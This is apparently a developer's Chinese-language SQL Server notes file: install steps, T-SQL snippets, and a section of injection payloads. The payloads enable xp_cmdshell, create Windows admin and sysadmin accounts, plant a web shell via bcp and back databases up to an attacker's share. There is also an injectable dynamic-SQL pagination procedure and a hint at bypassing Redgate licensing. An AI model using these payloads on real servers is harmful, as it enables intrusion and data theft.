- 链接服务器229Err
- GRANT EXECUTE ON SYS.XP_PROP_OLEDB_PROVIDER TO username;
- [mysql与sqlserver互转](http://blog.csdn.net/zzq900503/article/details/17505295)
- [mysql与sqlserver互转](https://www.bbsmax.com/A/GBJrnDxBJ0/)

# CentOS7-SQLServer，你不会真的在Unix上还要装SQLServer吧，看看就行
```java
yum -y install wget
wget https://packages.microsoft.com/config/rhel/7/mssql-server.repo
wget https://packages.microsoft.com/config/rhel/7/prod.repo
mv mssql-server.repo /etc/yum.repos.d/mssql.repo
mv prod.repo /etc/yum.repos.d/prod.repo
yum install -y mssql-server
/opt/mssql/bin/mssql-conf setup
/opt/mssql/bin/sqlservr -setup 
systemctl start mssql-server
systemctl enable mssql-server
yum install -y mssql-tools
firewall-cmd --permanent --zone=public --add-port=1433/tcp
echo 'export PATH="$PATH:/opt/mssql-tools/bin"' >> ~/.bashrc
source ~/.bashrc
sqlcmd -H 127.0.0.1 -U sa
```
# docker
```sh
docker pull microsoft/mssql-server-linux
docker create -v /var/opt/mssql --name mssql microsoft/mssql-server-linux /bin/true
docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=12345678@Abc'  -p 1433:1433 --volumes-from mssql -d microsoft/mssql-server-linux
docker run -p 1433:1433 -v ~/DB/mssql:/var/opt/mssql/data -d microsoft/mssql-server-linux
docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=12345678@Abc'  -p 1433:1433  -d microsoft/mssql-server-linux
docker inspect --format "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}" id
```
# 动态拼接防注入分页查询
```sql
    DECLARE @SQL NVARCHAR(MAX)--sp_executesql需要用NVARCHAR类型
    CREATE TABLE #tmp(isid int)
	SET @SQL=' INSERT INTO #tmp SELECT isid FROM ( 
    SELECT isid	,ROW_NUMBER() OVER(ORDER BY isid,@param1 DESC ) AS Rowid
	FROM dbo.dt_table a WHERE 1=1 '
	IF ISNULL(@param1,'')<>'' 
		BEGIN
		SET @SQL=@SQL+' AND a.param1 = @param1 '
		END	
	IF(ISNULL(@param2,'')<>'') 
		BEGIN
		SET @param2 = '' + @param2 + ''
		SET @SQL=@SQL+' AND a.param2 IN (SELECT COL FROM dbo.ufn_SplitEx(@param2,'','',1))'
		END
	IF ISNULL(@param3,'N')='Y' 
		SET @SQL=@SQL+' AND a.param3 = @param3 '
	IF ISNULL(@param4,'')<>'' 
		BEGIN
		SET @param4 = '%' + @param4 + '%'
		SET @SQL=@SQL+' AND (a.param4 LIKE @param4 OR a.param5 LIKE @param4) '
		END
	SET @SQL=@SQL+' ) as b where b.Rowid BETWEEN @beginrow AND @endrow '

	EXEC sp_executesql @SQL,N'@param1 varchar(60),@param2 varchar(10),@param3 VARCHAR(32),@param4 NVARCHAR(20),@beginrow INT,@endrow INT', @param1=@param1,@param2=@param2,@param3=@param3,@param4=@param4,@beginrow=@beginrow,@endrow=@endrow
	
	SELECT * FROM dt_tabel WHERE isid IN (SELECT isid FROM #tmp)

```
# 常用方法
```sql
select REPLACE(replace(replace(CONVERT(VARCHAR(10), getdate(), 120 ),'-',''),' ',''),':','')
```
# 序号
```sql
UPDATE x
SET x.Queue = x.QueueNo,x.QKNO=@QKNO
FROM (
      SELECT QKNO,Queue, ROW_NUMBER() OVER (ORDER BY isid) AS QueueNo
      FROM #tb_table WHERE param2=@param2 AND param1=@param1
      ) x
```
# 多行转一行
```sql
SELECT TOP 100 A.YDNO,A.DocDate, ZZANDDT=
STUFF(
(SELECT ','+B.DocNo FROM dbo.tb_tableB AS B
WHERE B.YDNO=A.YDNO FOR XML PATH (''))
,1,1,'')
FROM dbo.tb_tableA A WHERE 1=1
ORDER BY A.CreationDate DESC
```
# 游标
```sql
BEGIN TRAN
    DECLARE @isid INT
    DECLARE CusCursor CURSOR FOR
    SELECT isid FROM dbo.dt_CarInfo

    OPEN CusCursor 
    FETCH NEXT FROM CusCursor INTO @isid
    WHILE (@@FETCH_STATUS = 0)
         BEGIN

		 SELECT * FROM dbo.dt_CarInfo WHERE isid=@isid

		 IF(@@ERROR != 0)
         BEGIN
           ROLLBACK TRAN
           RETURN
         END
         
         FETCH NEXT FROM CusCursor INTO @isid
         END
     CLOSE CusCursor 
     DEALLOCATE CusCursor 
COMMIT TRAN
```
# 事务
```sql
ALTER PROC usp_AccountTransaction  
  
    @AccountNum INT,  
  
    @Amount DECIMAL  
  
AS  
  
BEGIN  
  
    BEGIN TRY --Start the Try Block..  
  
        BEGIN TRANSACTION -- Start the transaction..  
  
            UPDATE MyChecking SET Amount = Amount - @Amount  
  
                WHERE AccountNum = @AccountNum  
  
            UPDATE MySavings SET Amount = Amount + @Amount  
  
                WHERE AccountNum = @AccountNum  
  
        COMMIT TRAN -- Transaction Success!  
  
    END TRY  
  
    BEGIN CATCH  
  
        IF @@TRANCOUNT > 0  
  
            ROLLBACK TRAN --RollBack in case of Error  
  
        -- you can Raise ERROR with RAISEERROR() Statement including the details of the exception  
  
        RAISERROR(ERROR_MESSAGE(), ERROR_SEVERITY(), 1)  
  
    END CATCH  
  
END  
ERROR_NUMBER()	返回导致运行 CATCH 块的错误消息的错误号。
ERROR_SEVERITY()	返回导致 CATCH 块运行的错误消息的严重级别
ERROR_STATE()	返回导致 CATCH 块运行的错误消息的状态号
ERROR_PROCEDURE()	返回出现错误的存储过程名称
ERROR_LINE()	返回发生错误的行号
ERROR_MESSAGE()	返回导致 CATCH 块运行的错误消息的完整文本

```
# 分页
```sql
(
    @tablename NVARCHAR(4000),--表名
	@selcolumn NVARCHAR(1000),--查询字段
	@where NVARCHAR(1000),--where条件
	@sortcolumn  NVARCHAR(255),--排序字段
	@pagecount  INT,--每页记录数
	@pageindex  INT--页号
)

    DECLARE @beginrow INT
	DECLARE @endrow INT

	SET @beginrow=0
	SET @endrow=0
    SET @beginrow=(@pageindex-1)*@pagecount+1
	SET @endrow=@pageindex*@pagecount

	DECLARE @sqlstr NVARCHAR(4000)=''
	--SET @sqlstr='with table1 as(select '+ @selcolumn +',ROW_NUMBER() OVER(ORDER BY '+ @sortcolumn+' ) AS ROW'+
	--			' FROM '+@tablename+' WHERE '+@where+') '
	--set @sqlstr=@sqlstr +' SELECT '+ @selcolumn +' FROM TABLE1 WHERE ROW BETWEEN '+cast(@beginrow as nvarchar )+' and '+cast(@endrow as nvarchar)
	--SET @sqlstr=@sqlstr +' SELECT * FROM TABLE1 WHERE ROW BETWEEN '+CAST(@beginrow AS NVARCHAR )+' and '+CAST(@endrow AS NVARCHAR)

	SET @sqlstr=@sqlstr +' SELECT * FROM (select '+ @selcolumn +',ROW_NUMBER() OVER(ORDER BY '+ @sortcolumn+' ) AS ROW'+
				' FROM '+@tablename+' WHERE '+@where+') AS a WHERE ROW BETWEEN '+CAST(@beginrow AS NVARCHAR )+' and '+CAST(@endrow AS NVARCHAR)

	PRINT @sqlstr
	EXEC(@sqlstr)
```
# 求和
```sql
SELECT SUM( CASE WHEN ARAP='收'THEN ISNULL(Amount,0) WHEN ARAP='支'
THEN ISNULL(-Amount,0) END ) 
FROM dbo.tablename  WHERE  DocNo='xxx'

```
1. Sql Server插入数据并返回自增ID：@@IDENTITY，SCOPE_IDENTITY和IDENT_CURRENT的区别：@@IDENTITY是取全局操作的最后一步操作所产生的自增域的值的。如果在写存储过程时，向表中新增了一条数据，需要返回该IDENTITY值，则使用 SCOPE_IDENTITY()，因为它和当前会话相关联，不会返回一个你不需要的值。如果你仅仅想得到某个IDENTITY列的最后一个值，则使用 IDENT_CURRENT()最方便。[原文链接](http://www.bbsmax.com/A/q4zVVyylzK/)
2. 117.18.232.200 是redgate的认证IP，你懂的

# 注入
```sql
添加系统用户
a%' EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; exec master..xp_cmdshell 'net user test testpass /ADD' --
a' exec master..xp_cmdshell 'net localgroup /add administrators test' --

1)   猜测数据库名，备份数据库
a)   猜测数据库名： and db_name() >0 或系统表master.dbo.sysdatabases
b)   备份数据库：;backup database 数据库名 to disk = ‘c:\*.db’;--
或：declare @a sysname;set @a=db_name();backup database @a to disk='你的IP你的共享目录bak.dat' ,name='test';--
2)   猜解字段名称
a)   猜解法：and (select count(字段名) from 表名)>0   若“字段名”存在，则返回正常
b)   读取法：and (select top 1 col_name(object_id('表名'),1) from sysobjects)>0   把col_name(object_id('表名'),1)中的1依次换成2,3,4,5，6…就可得到所有的字段名称。
3)   遍历系统的目录结构，分析结构并发现WEB虚拟目录（服务器上传木马）
    先创建一个临时表：;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
a)   利用xp_availablemedia来获得当前所有驱动器,并存入temp表中
;insert temp exec master.dbo.xp_availablemedia;--
b)   利用xp_subdirs获得子目录列表,并存入temp表中
;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';--
c)   利用xp_dirtree可以获得“所有”子目录的目录树结构,并存入temp表中
;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';-- （实验成功）
d)   利用 bcp 命令将表内容导成文件
即插入木马文本，然后导出存为文件。比如导出为asp文件，然后通过浏览器访问该文件并执行恶意脚本。（使用该命令必须启动’ xp_cmdshell’）
Exec master..xp_cmdshell N'BCP "select * from SchoolMarket.dbo.GoodsStoreData;" queryout c:/inetpub/wwwroot/runcommand.asp -w -S"localhost" -U"sa" -P"123"'
(注意：语句中使用的是双引号，另外表名格式为“数据库名.用户名.表名”)
在sql查询器中通过语句：Exec master..xp_cmdshell N'BCP’即可查看BCP相关参数


4)   查询当前用户的数据库权限
MSSQL中一共存在8种权限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。
可通过1=(select IS_SRVROLEMEMBER('sysadmin'))得到当前用户是否具有该权限。
5)   设置新的数据库帐户（得到MSSQL管理员账户）
d)   在数据库内添加一个hax用户，默认密码是空
;exec sp_addlogin'hax';--
e)   给hax设置密码 (null是旧密码，password是新密码，user是用户名)
;exec master.dbo.sp_password null,password,username;--
f)   将hax添加到sysadmin组
;exec master.dbo.sp_addsrvrolemember 'hax' ,'sysadmin';--
6)   xp_cmdshell MSSQL存储过程（得到 WINDOWS管理员账户 ）
通过(5)获取到sysadmin权限的帐户后，使用查询分析器连接到数据库，可通过xp_cmdshell运行系统命令行（必须是sysadmin权限），即使用 cmd.exe 工具，可以做什么自己多了解下。
下面我们使用xp_cmdshell来创建一个 Windows 用户，并开启远程登录服务：
a)   判断xp_cmdshell扩展存储过程是否存在
SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name ='xp_cmdshell'
b)   恢复xp_cmdshell扩展存储过程
Exec master.dbo.sp_addextendedproc 'xp_cmdshell','e:\inetput\web\xplog70.dll';
开启后使用xp_cmdshell还会报下面错误：
SQL Server 阻止了对组件 'xp_cmdshell' 的过程 'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
通过执行下面语句进行设置：
-- 允许配置高级选项
EXEC sp_configure 'show advanced options', 1
GO
-- 重新配置
RECONFIGURE
GO
-- 启用xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0
GO
--重新配置
RECONFIGURE
GO
c)   禁用xp_cmdshell扩展存储过程
Exec master.dbo.sp_dropextendedproc 'xp_cmdshell';
d)   添加windows用户：
Exec xp_cmdshell 'net user awen /add';
e)   设置好密码：
Exec xp_cmdshell 'net user awen password';
f)   提升到管理员：
Exec xp_cmdshell 'net localgroup administrators awen /add';
g)   开启telnet服务：
Exec xp_cmdshell 'net start tlntsvr'
7)   没有xp_cmdshell扩展程序，也可创建Windows帐户的办法.
(本人windows7系统，测试下面SQL语句木有效果)
declare @shell int ;
execsp_OAcreate 'w script .shell',@shell output ;
execsp_OAmethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c net user awen /add';
execsp_OAmethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c net user awen 123';
execsp_OAmethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c net localgroup administrators awen /add';
在使用的时候会报如下错：
SQL Server 阻止了对组件 'Ole Automation Procedures' 的过程 'sys.sp_OACreate'、'sys.sp_OAMethod' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用 'Ole Automation Procedures'。有关启用 'Ole Automation Procedures' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
        解决办法：
sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
sp_configure 'Ole Automation Procedures', 1;
GO
RECONFIGURE;
GO
好了，这样别人可以登录你的服务器了，你怎么看？
8)   客户端脚本攻击
攻击1：（正常输入）攻击者通过正常的输入提交方式将恶意脚本提交到数据库中，当其他用户浏览此内容时就会受到恶意脚本的攻击。
措施：转义提交的内容，.NET 中可通过System.Net.WebUtility.HtmlEncode(string) 方法将字符串转换为HTML编码的字符串。
 
攻击2：（SQL注入）攻击者通过SQL注入方式将恶意脚本提交到数据库中，直接使用SQL语法UPDATE数据库，为了跳过System.Net.WebUtility.HtmlEncode(string) 转义，攻击者会将注入SQL经过“HEX编码”，然后通过exec可以执行“动态”SQL的特性运行脚本”


declare @A varchar(200);set @A=reverse('''58803303431''=emanresu erehw ''9d4d9c1ac9814f08''=drowssaP tes xxx tadpu');

xp_：扩展存储过程的前缀，SQL注入攻击得手之后，攻击者往往会通过执行xp_cmdshell之类的扩展存储过程，获取系统信息，甚至控制、破坏系统。
xp_cmdshell
能执行dos命令，通过语句sp_dropextendedproc删除，
不过依然可以通过sp_addextendedproc来恢复，因此最好删除或改名xplog70.dll（sql server 2000、windows7）
xpsql70.dll(sqlserer 7.0)
xp_fileexist
用来确定一个文件是否存在
xp_getfiledetails
可以获得文件详细资料
xp_dirtree
可以展开你需要了解的目录，获得所有目录深度
Xp_getnetname
可以获得服务器名称
Xp_regaddmultistring
Xp_regdeletekey
Xp_regdeletevalue
Xp_regenumvalues
Xp_regread
Xp_regremovemultistring
Xp_regwrite
可以访问注册表的存储过程
Sp_OACreate
Sp_OADestroy
Sp_OAGetErrorInfo
Sp_OAGetProperty
Sp_OAMethod
Sp_OASetProperty
Sp_OAStop
如果你不需要请丢弃OLE自动存储过程

如果在存储过程中SQL语法很复杂需要根据逻辑进行拼接，这时是否还具有放注入的功能？
答：MSSQL中可以通过 EXEC 和sp_executesql动态执行拼接的sql语句，但sp_executesql支持替换 Transact-SQL 字符串中指定的任何参数值， EXECUTE 语句不支持。所以只有使用sp_executesql方式才能启到参数化防止SQL注入。
关键代码：（详细见示例）
a)   sp_executesql
CREATE PROCEDURE PROC_Login_executesql(
@userNamenvarchar(10),
@password nvarchar(10),
@count int OUTPUT
)
AS
BEGIN
   DECLARE @s nvarchar(1000);
set @s=N'SELECT @count=COUNT(*) FROM Login WHERE UserName=@userName AND Password=@password';
   EXEC sp_executesql @s,N'@userName nvarchar(10),@password nvarchar(10),@count int output',@userName=@userName,@password=@password,@count=@count output
END


b)   EXECUTE（注意sql中拼接字符，对于字符参数需要额外包一层单引号，需要输入两个单引号来标识sql中的一个单引号）

CREATE PROCEDURE PROC_Login_EXEC(
@userNamenvarchar(10),
@password varchar(20)
)
AS
BEGIN
   DECLARE @s nvarchar(1000);
set @s='SELECT @count=COUNT(*) FROM Login WHERE UserName='''+CAST(@userName AS NVARCHAR(10))+''' AND Password='''+CAST(@password AS VARCHAR(20))+'''';
EXEC('DECLARE @count int;' +@s+'select @count');
END

```